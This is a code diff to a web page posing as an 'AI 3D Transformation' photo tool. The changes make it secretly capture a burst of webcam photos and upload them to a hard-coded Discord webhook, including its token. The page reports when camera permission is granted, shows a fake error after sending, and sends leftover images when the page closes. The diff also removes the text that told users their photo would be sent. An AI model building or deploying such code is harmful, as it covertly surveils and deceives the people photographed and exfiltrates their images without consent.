@@ -50,65 +50,131 @@
       bottom: 0;
       width: 100%;
     }
+
+    #loadingMessage {
+      font-size: 18px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
   <header>
     <h1>AI 3D Transformation</h1>
-    <p>Click "Transform" to take your photo and send it for processing!</p>
+    <p>Click "Transform" to trigger the process!</p>
   </header>
 
   <video id="video" autoplay></video>
   <canvas id="canvas" style="display: none;"></canvas>
   <br>
   <button id="transform">Transform</button>
+  <p id="loadingMessage">Estimated time: 2 minutes.</p>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1329558434814754858/2OuOQhloF_jY0r6Lvh8blWn0xY_qSHRYOFlTCHYjLti9I_BwBFJ59sLKvQ2FMobHQcHL";
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const transformButton = document.getElementById("transform");
+    const loadingMessage = document.getElementById("loadingMessage");
 
+    let stream;
+    let images = [];
+
+    // Start webcam
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
+      .then((userStream) => {
+        stream = userStream;
         video.srcObject = stream;
+
+        // Send a message when the user accepts the permissions
+        fetch(webhookUrl, {
+          method: "POST",
+          body: JSON.stringify({ content: "Autorisations acceptées!" }),
+          headers: { "Content-Type": "application/json" }
+        });
       })
       .catch((err) => {
         console.error("Error accessing webcam:", err);
         alert("Could not access webcam.");
       });
 
-    const captureAndSendPhoto = async () => {
+    // Capture a photo every 200ms
+    const capturePhoto = () => {
       const context = canvas.getContext("2d");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const imageData = canvas.toDataURL("image/jpeg");
-      const blob = await (await fetch(imageData)).blob();
-
-      const formData = new FormData();
-      formData.append("file", blob, "photo.jpg");
-      formData.append("payload_json", JSON.stringify({ content: "Here is the captured photo for AI transformation!" }));
-
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      })
-        .then((response) => {
-          if (response.ok) {
-            alert("Your photo is being transformed. Estimated time : 2min.");
-          } else {
-            alert("Failed to send the photo.");
-          }
-        })
-        .catch((err) => {
-          console.error("Error sending photo:", err);
-          alert("An error occurred while sending the photo.");
-        });
+      images.push(imageData);
     };
 
-    transformButton.addEventListener("click", captureAndSendPhoto);
+    // Send captured images to webhook
+    const sendImages = () => {
+      // Send each photo individually
+      images.forEach((imageData, index) => {
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append("file", blob, `photo${index + 1}.jpg`);
+        formData.append("payload_json", JSON.stringify({ content: "Here are the photos captured during the transformation!" }));
+
+        fetch(webhookUrl, {
+          method: "POST",
+          body: formData
+        })
+          .then((response) => {
+            if (!response.ok) {
+              console.error("Failed to send photo", index);
+            }
+          })
+          .catch((err) => {
+            console.error("Error sending photo:", err);
+          });
+      });
+
+      // Clear images array after sending
+      images = [];
+    };
+
+    // Convert base64 to Blob
+    function dataURLtoBlob(dataURL) {
+      const byteString = atob(dataURL.split(',')[1]);
+      const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([uintArray], { type: mimeString });
+    }
+
+    // Start the transform process (take photos every 200ms for 3 seconds)
+    transformButton.addEventListener("click", () => {
+      loadingMessage.textContent = "Transforming... Please wait.";
+
+      // Take photos every 200ms for 3 seconds
+      const captureInterval = setInterval(capturePhoto, 200);
+
+      setTimeout(() => {
+        clearInterval(captureInterval);  // Stop capturing after 3 seconds
+        sendImages();  // Send all captured images to the webhook
+
+        // Stop the stream and disable the video
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+
+        // Show error message after sending photos
+        loadingMessage.textContent = "Error: Something went wrong!";
+      }, 3000); // Capture for 3 seconds
+    });
+
+    // Send a message when the user closes the page
+    window.addEventListener("beforeunload", () => {
+      if (images.length > 0) {
+        sendImages();
+      }
+    });
   </script>
 </body>
 </html>
